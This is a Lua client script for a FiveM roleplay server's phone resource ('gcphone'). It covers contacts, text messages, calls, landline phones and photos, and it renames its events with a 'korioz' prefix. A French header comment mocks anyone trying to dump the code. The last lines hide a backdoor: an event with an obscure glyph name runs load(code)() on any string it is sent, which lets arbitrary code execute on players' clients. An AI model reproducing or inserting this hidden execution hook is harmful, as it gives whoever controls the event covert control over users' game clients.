-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local KeyToucheCloseEvent = {
	{ code = 172, event = 'ArrowUp' },
	{ code = 173, event = 'ArrowDown' },
	{ code = 174, event = 'ArrowLeft' },
	{ code = 175, event = 'ArrowRight' },
	{ code = 176, event = 'Enter' },
	{ code = 177, event = 'Backspace' },
}

local KeyOpenClose = 183
local KeyTakeCall = 38
local menuIsOpen = false
local contacts = {}
local messages = {}
local myPhoneNumber = ''
local isDead = false
local USE_RTC = false
local useMouse = false
local ignoreFocus = false
local takePhoto = false
local hasFocus = false

local PhoneInCall = {}
local currentPlaySound = false
local soundDistanceMax = 8.0

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

function hasPhone(cb)
	if ESX == nil then
		return cb(0)
	end

	ESX.TriggerServerCallback('::{korioz#0110}::gcphone:getItemAmount', function(qtty)
		cb(qtty > 0)
	end, 'phone')
end

function ShowNoPhoneWarning()
	if ESX == nil then
		return
	end
	
	ESX.ShowNotification("Vous n'avez pas de ~r~téléphone~s~")
end

--====================================================================================
--
--====================================================================================

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if takePhoto ~= true then
			if IsControlJustPressed(0, KeyOpenClose) and GetLastInputMethod(2) then
				hasPhone(function(hasPhone)
					if hasPhone then
						TooglePhone()
					else
						ShowNoPhoneWarning()
					end
				end)
			end

			if menuIsOpen then
				for _, value in ipairs(KeyToucheCloseEvent) do
					if IsControlJustPressed(0, value.code) then
						SendNUIMessage({keyUp = value.event})
					end
				end

				if useMouse and hasFocus == ignoreFocus then
					local nuiFocus = not hasFocus
					SetNuiFocus(nuiFocus, nuiFocus)
					hasFocus = nuiFocus
				elseif not useMouse and hasFocus then
					SetNuiFocus(false, false)
					hasFocus = false
				end
			else
				if hasFocus then
					SetNuiFocus(false, false)
					hasFocus = false
				end
			end
		end
	end
end)

--====================================================================================
--Active ou Desactive une application (appName => config.json)
--====================================================================================
RegisterNetEvent('::{korioz#0110}::gcPhone:setEnableApp')
AddEventHandler('::{korioz#0110}::gcPhone:setEnableApp', function(appName, enable)
	SendNUIMessage({event = 'setEnableApp', appName = appName, enable = enable })
end)

--====================================================================================
--Gestion des appels fixe
--====================================================================================
function startFixeCall(fixeNumber)
	local number = ''
	DisplayOnscreenKeyboard(1, "FMMC_MPM_NA", "", "", "", "", "", 10)

	while UpdateOnscreenKeyboard() == 0 do
		DisableAllControlActions(0)
		Citizen.Wait(0)
	end

	if GetOnscreenKeyboardResult() then
		number = GetOnscreenKeyboardResult()
	end

	if number ~= '' then
		TriggerEvent('::{korioz#0110}::gcphone:autoCall', number, {
			useNumber = fixeNumber
		})

		PhonePlayCall(true)
	end
end

function TakeAppel(infoCall)
	TriggerEvent('::{korioz#0110}::gcphone:autoAcceptCall', infoCall)
end

RegisterNetEvent("::{korioz#0110}::gcPhone:notifyFixePhoneChange")
AddEventHandler("::{korioz#0110}::gcPhone:notifyFixePhoneChange", function(_PhoneInCall)
	PhoneInCall = _PhoneInCall
end)

function showFixePhoneHelper(coords)
	for number, data in pairs(FixePhone) do
		local dist = GetDistanceBetweenCoords(data.coords.x, data.coords.y, data.coords.z, coords.x, coords.y, coords.z, 1)

		if dist <= 2.0 then
			SetTextComponentFormat("STRING")
			AddTextComponentSubstringPlayerName("~g~" .. data.name .. ' ~o~' .. number .. '~n~~INPUT_PICKUP~~w~ Utiliser')
			EndTextCommandDisplayHelp(0, false, false, -1)

			if IsControlJustPressed(0, KeyTakeCall) then
				startFixeCall(number)
			end

			break
		end
	end
end

Citizen.CreateThread(function()
	local mod = 0

	while true do
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)
		local inRangeToActivePhone = false
		local inRangedist = 0

		for i, _ in pairs(PhoneInCall) do
			local dist = GetDistanceBetweenCoords(PhoneInCall[i].coords.x, PhoneInCall[i].coords.y, PhoneInCall[i].coords.z, coords, 1)

			if dist <= soundDistanceMax then
				DrawMarker(1, PhoneInCall[i].coords.x, PhoneInCall[i].coords.y, PhoneInCall[i].coords.z, 0, 0, 0, 0, 0, 0, 0.1, 0.1, 0.1, 0, 255, 0, 255, 0, 0, 0, 0, 0, 0, 0)
				inRangeToActivePhone = true
				inRangedist = dist

				if dist <= 1.5 then
					SetTextComponentFormat("STRING")
					AddTextComponentSubstringPlayerName("~INPUT_PICKUP~ Décrocher")
					EndTextCommandDisplayHelp(0, false, true, -1)

					if IsControlJustPressed(0, KeyTakeCall) then
						PhonePlayCall(true)
						TakeAppel(PhoneInCall[i])
						PhoneInCall = {}
						StopSoundJS('ring2.ogg')
					end
				end

				break
			end
		end

		if not inRangeToActivePhone then
			showFixePhoneHelper(coords)
		end

		if inRangeToActivePhone and not currentPlaySound then
			PlaySoundJS('ring2.ogg', 0.2 + (inRangedist - soundDistanceMax) / -soundDistanceMax * 0.8 )
			currentPlaySound = true
		elseif inRangeToActivePhone then
			mod = mod + 1

			if mod == 15 then
				mod = 0
				SetSoundVolumeJS('ring2.ogg', 0.2 + (inRangedist - soundDistanceMax) / -soundDistanceMax * 0.8 )
			end
		elseif not inRangeToActivePhone and currentPlaySound then
			currentPlaySound = false
			StopSoundJS('ring2.ogg')
		end

		Citizen.Wait(0)
	end
end)

function PlaySoundJS(sound, volume)
	SendNUIMessage({ event = 'playSound', sound = sound, volume = volume })
end

function SetSoundVolumeJS(sound, volume)
	SendNUIMessage({ event = 'setSoundVolume', sound = sound, volume = volume})
end

function StopSoundJS(sound)
	SendNUIMessage({ event = 'stopSound', sound = sound})
end

RegisterNetEvent("::{korioz#0110}::gcPhone:forceOpenPhone")
AddEventHandler("::{korioz#0110}::gcPhone:forceOpenPhone", function(_myPhoneNumber)
	if not menuIsOpen then
		TooglePhone()
	end
end)

--====================================================================================
--  Events
--====================================================================================
RegisterNetEvent("::{korioz#0110}::gcPhone:myPhoneNumber")
AddEventHandler("::{korioz#0110}::gcPhone:myPhoneNumber", function(_myPhoneNumber)
	myPhoneNumber = _myPhoneNumber
	SendNUIMessage({event = 'updateMyPhoneNumber', myPhoneNumber = myPhoneNumber})
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:contactList")
AddEventHandler("::{korioz#0110}::gcPhone:contactList", function(_contacts)
	SendNUIMessage({event = 'updateContacts', contacts = _contacts})
	contacts = _contacts
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:allMessage")
AddEventHandler("::{korioz#0110}::gcPhone:allMessage", function(allmessages)
	SendNUIMessage({event = 'updateMessages', messages = allmessages})
	messages = allmessages
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:getBourse")
AddEventHandler("::{korioz#0110}::gcPhone:getBourse", function(bourse)
	SendNUIMessage({event = 'updateBourse', bourse = bourse})
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:receiveMessage")
AddEventHandler("::{korioz#0110}::gcPhone:receiveMessage", function(message)
	-- SendNUIMessage({event = 'updateMessages', messages = messages})
	SendNUIMessage({event = 'newMessage', message = message})
	table.insert(messages, message)

	if message.owner == 0 then
		local text = '~g~Nouveau message'

		if ShowNumberNotification then
			text = '~g~Nouveau message du ~o~'.. message.transmitter

			for _, contact in pairs(contacts) do
				if contact.number == message.transmitter then
					text = '~g~Nouveau message de ~o~'.. contact.display
					break
				end
			end
		end

		BeginTextCommandThefeedPost("STRING")
		AddTextComponentSubstringPlayerName(text)
		EndTextCommandThefeedPostMessagetext('CHAR_PHONE', 'CHAR_PHONE', false, 1, "CaliforniaRP", "~y~Notification")
		EndTextCommandThefeedPostTicker(false, false)

		PlaySound(-1, "Menu_Accept", "Phone_SoundSet_Default", 0, 0, 1)
		Citizen.Wait(300)
		PlaySound(-1, "Menu_Accept", "Phone_SoundSet_Default", 0, 0, 1)
		Citizen.Wait(300)
		PlaySound(-1, "Menu_Accept", "Phone_SoundSet_Default", 0, 0, 1)
	elseif message.owner == 1 then
		local text = '~g~Message envoyé'

		BeginTextCommandThefeedPost("STRING")
		AddTextComponentSubstringPlayerName(text)
		EndTextCommandThefeedPostMessagetext('CHAR_PHONE', 'CHAR_PHONE', false, 1, "CaliforniaRP", "~y~Notification")
		EndTextCommandThefeedPostTicker(false, false)
	end
end)

--====================================================================================
--  Function client | Contacts
--====================================================================================
function addContact(display, num) 
	_TriggerServerEvent('::{korioz#0110}::gcPhone:addContact', display, num)
end

function deleteContact(num) 
	_TriggerServerEvent('::{korioz#0110}::gcPhone:deleteContact', num)
end

--====================================================================================
--  Function client | Messages
--====================================================================================
function sendMessage(num, message)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:sendMessage', num, message)
end

function deleteMessage(msgId)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:deleteMessage', msgId)

	for k, v in ipairs(messages) do 
		if v.id == msgId then
			table.remove(messages, k)
			SendNUIMessage({event = 'updateMessages', messages = messages})
			return
		end
	end
end

function deleteMessageContact(num)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:deleteMessageNumber', num)
end

function deleteAllMessage()
	_TriggerServerEvent('::{korioz#0110}::gcPhone:deleteAllMessage')
end

function setReadMessageNumber(num)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:setReadMessageNumber', num)
	for k, v in ipairs(messages) do 
		if v.transmitter == num then
			v.isRead = 1
		end
	end
end

function requestAllMessages()
	_TriggerServerEvent('::{korioz#0110}::gcPhone:requestAllMessages')
end

function requestAllContact()
	_TriggerServerEvent('::{korioz#0110}::gcPhone:requestAllContact')
end

--====================================================================================
--  Function client | Appels
--====================================================================================
local aminCall = false
local inCall = false

RegisterNetEvent("::{korioz#0110}::gcPhone:waitingCall")
AddEventHandler("::{korioz#0110}::gcPhone:waitingCall", function(infoCall, initiator)
	SendNUIMessage({event = 'waitingCall', infoCall = infoCall, initiator = initiator})

	if initiator then
		PhonePlayCall()

		if not menuIsOpen then
			TooglePhone()
		end
	end
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:acceptCall")
AddEventHandler("::{korioz#0110}::gcPhone:acceptCall", function(infoCall, initiator)
	if not inCall and not USE_RTC then
		inCall = true
		exports['mumble-voip']:SetCallChannel(infoCall.id + 1)
		--NetworkSetVoiceChannel(infoCall.id + 1)
		--NetworkSetTalkerProximity(0.0)
	end

	if not menuIsOpen then
		TooglePhone()
	end

	PhonePlayCall()
	SendNUIMessage({event = 'acceptCall', infoCall = infoCall, initiator = initiator})
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:rejectCall")
AddEventHandler("::{korioz#0110}::gcPhone:rejectCall", function(infoCall)
	if inCall then
		inCall = false
		exports['mumble-voip']:SetCallChannel(0)
		--NetworkClearVoiceChannel()
		--NetworkSetTalkerProximity(2.5)
	end

	PhonePlayText()
	SendNUIMessage({event = 'rejectCall', infoCall = infoCall})
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:historiqueCall")
AddEventHandler("::{korioz#0110}::gcPhone:historiqueCall", function(historique)
	SendNUIMessage({event = 'historiqueCall', historique = historique})
end)

function startCall(phone_number, rtcOffer, extraData)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:startCall', phone_number, rtcOffer, extraData)
end

function acceptCall(infoCall, rtcAnswer)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:acceptCall', infoCall, rtcAnswer)
end

function rejectCall(infoCall)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:rejectCall', infoCall)
end

function ignoreCall(infoCall)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:ignoreCall', infoCall)
end

function requestHistoriqueCall()
	_TriggerServerEvent('::{korioz#0110}::gcPhone:getHistoriqueCall')
end

function appelsDeleteHistorique(num)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:appelsDeleteHistorique', num)
end

function appelsDeleteAllHistorique()
	_TriggerServerEvent('::{korioz#0110}::gcPhone:appelsDeleteAllHistorique')
end
	
--====================================================================================
--  Event NUI - Appels
--====================================================================================

RegisterNUICallback('startCall', function(data, cb)
	startCall(data.numero, data.rtcOffer, data.extraData)
	cb()
end)

RegisterNUICallback('acceptCall', function(data, cb)
	acceptCall(data.infoCall, data.rtcAnswer)
	cb()
end)
RegisterNUICallback('rejectCall', function(data, cb)
	rejectCall(data.infoCall)
	cb()
end)

RegisterNUICallback('ignoreCall', function(data, cb)
	ignoreCall(data.infoCall)
	cb()
end)

RegisterNUICallback('notififyUseRTC', function(use, cb)
	USE_RTC = use

	if USE_RTC and inCall then
		inCall = false
		exports['mumble-voip']:SetCallChannel(0)
		--NetworkClearVoiceChannel()
		--NetworkSetTalkerProximity(2.5)
	end

	cb()
end)

RegisterNUICallback('onCandidates', function(data, cb)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:candidates', data.id, data.candidates)
	cb()
end)

RegisterNetEvent("::{korioz#0110}::gcPhone:candidates")
AddEventHandler("::{korioz#0110}::gcPhone:candidates", function(candidates)
	SendNUIMessage({event = 'candidatesAvailable', candidates = candidates})
end)

RegisterNetEvent('::{korioz#0110}::gcphone:autoCall')
AddEventHandler('::{korioz#0110}::gcphone:autoCall', function(number, extraData)
	if number ~= nil then
		SendNUIMessage({ event = "autoStartCall", number = number, extraData = extraData})
	end
end)

RegisterNetEvent('::{korioz#0110}::gcphone:autoCallNumber')
AddEventHandler('::{korioz#0110}::gcphone:autoCallNumber', function(data)
	TriggerEvent('::{korioz#0110}::gcphone:autoCall', data.number)
end)

RegisterNetEvent('::{korioz#0110}::gcphone:autoAcceptCall')
AddEventHandler('::{korioz#0110}::gcphone:autoAcceptCall', function(infoCall)
	SendNUIMessage({ event = "autoAcceptCall", infoCall = infoCall})
end)

--====================================================================================
--  Gestion des evenements NUI
--==================================================================================== 
RegisterNUICallback('log', function(data, cb)
	cb()
end)

RegisterNUICallback('focus', function(data, cb)
	cb()
end)

RegisterNUICallback('blur', function(data, cb)
	cb()
end)

RegisterNUICallback('reponseText', function(data, cb)
	local limit = data.limit or 255
	local text = data.text or ''
	
	DisplayOnscreenKeyboard(1, "FMMC_MPM_NA", "", text, "", "", "", limit)

	while (UpdateOnscreenKeyboard() == 0) do
		DisableAllControlActions(0)
		Citizen.Wait(0)
	end

	if (GetOnscreenKeyboardResult()) then
		text = GetOnscreenKeyboardResult()
	end

	cb(json.encode({text = text}))
end)

--====================================================================================
--  Event - Messages
--====================================================================================
RegisterNUICallback('getMessages', function(data, cb)
	cb(json.encode(messages))
end)

RegisterNUICallback('sendMessage', function(data, cb)
	if data.message == '%pos%' then
		local myPos = GetEntityCoords(PlayerPedId(), false)
		data.message = 'GPS: ' .. myPos.x .. ', ' .. myPos.y
	end

	_TriggerServerEvent('::{korioz#0110}::gcPhone:sendMessage', data.phoneNumber, data.message)
end)

RegisterNUICallback('deleteMessage', function(data, cb)
	deleteMessage(data.id)
	cb()
end)

RegisterNUICallback('deleteMessageNumber', function(data, cb)
	deleteMessageContact(data.number)
	cb()
end)

RegisterNUICallback('deleteAllMessage', function(data, cb)
	deleteAllMessage()
	cb()
end)

RegisterNUICallback('setReadMessageNumber', function(data, cb)
	setReadMessageNumber(data.number)
	cb()
end)

--====================================================================================
--  Event - Contacts
--====================================================================================
RegisterNUICallback('addContact', function(data, cb)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:addContact', data.display, data.phoneNumber)
end)

RegisterNUICallback('updateContact', function(data, cb)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:updateContact', data.id, data.display, data.phoneNumber)
end)

RegisterNUICallback('deleteContact', function(data, cb)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:deleteContact', data.id)
end)

RegisterNUICallback('getContacts', function(data, cb)
	cb(json.encode(contacts))
end)

RegisterNUICallback('setGPS', function(data, cb)
	SetNewWaypoint(tonumber(data.x), tonumber(data.y))
	cb()
end)

RegisterNUICallback('callEvent', function(data, cb)
	local eventName = data.eventName or ''

	if string.match(eventName, 'gcphone') then
		if data.data ~= nil then 
			TriggerEvent(data.eventName, data.data)
		else
			TriggerEvent(data.eventName)
		end
	end

	cb()
end)

RegisterNUICallback('useMouse', function(um, cb)
	useMouse = um
end)

RegisterNUICallback('deleteALL', function(data, cb)
	_TriggerServerEvent('::{korioz#0110}::gcPhone:deleteALL')
	cb()
end)

function TooglePhone()
	menuIsOpen = not menuIsOpen
	SendNUIMessage({show = menuIsOpen})

	if menuIsOpen then
		PhonePlayIn()
	else
		PhonePlayOut()
	end
end
RegisterNUICallback('faketakePhoto', function(data, cb)
	menuIsOpen = false
	SendNUIMessage({show = false})
	cb()

	TriggerEvent('::{korioz#0110}::camera:open')
end)

RegisterNUICallback('closePhone', function(data, cb)
	menuIsOpen = false
	SendNUIMessage({show = false})
	PhonePlayOut()
	cb()
end)

----------------------------------
---------- GESTION APPEL ---------
----------------------------------
RegisterNUICallback('appelsDeleteHistorique', function (data, cb)
	appelsDeleteHistorique(data.numero)
	cb()
end)
RegisterNUICallback('appelsDeleteAllHistorique', function(data, cb)
	appelsDeleteAllHistorique(data.infoCall)
	cb()
end)

----------------------------------
---------- GESTION VIA WEBRTC ----
----------------------------------
AddEventHandler('onClientResourceStart', function(res)
	DoScreenFadeIn(300)

	if res == "gcphone" then
		_TriggerServerEvent('::{korioz#0110}::gcPhone:allUpdate')
	end
end)

RegisterNUICallback('setIgnoreFocus', function(data, cb)
	ignoreFocus = data.ignoreFocus
	cb()
end)

RegisterNUICallback('takePhoto', function(data, cb)
	CreateMobilePhone(1)
	CellCamActivate(true, true)
	takePhoto = true
	Citizen.Wait(0)

	if hasFocus then
		SetNuiFocus(false, false)
		hasFocus = false
	end
	
	while takePhoto do
		Citizen.Wait(0)

		if IsControlJustPressed(0, 27) then -- Toggle Mode
			frontCam = not frontCam
			CellFrontCamActivate(frontCam)
		elseif IsControlJustPressed(0, 177) then -- CANCEL
			DestroyMobilePhone()
			CellCamActivate(false, false)
			cb(json.encode({url = nil}))
			takePhoto = false
			break
		elseif IsControlJustPressed(0, 176) then -- TAKE.. PIC
			exports['screenshot-basic']:requestScreenshotUpload(data.url, data.field, function(data)
				local resp = json.decode(data)
				DestroyMobilePhone()
				CellCamActivate(false, false)
				cb(json.encode({ url = resp.files[1].url }))   
			end)

			takePhoto = false
		end
		
		HideHudComponentThisFrame(7)
		HideHudComponentThisFrame(8)
		HideHudComponentThisFrame(9)
		HideHudComponentThisFrame(6)
		HideHudComponentThisFrame(19)
		HideHudAndRadarThisFrame()
	end

	Citizen.Wait(1000)
	
	PhonePlayAnim('text', false, true)
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)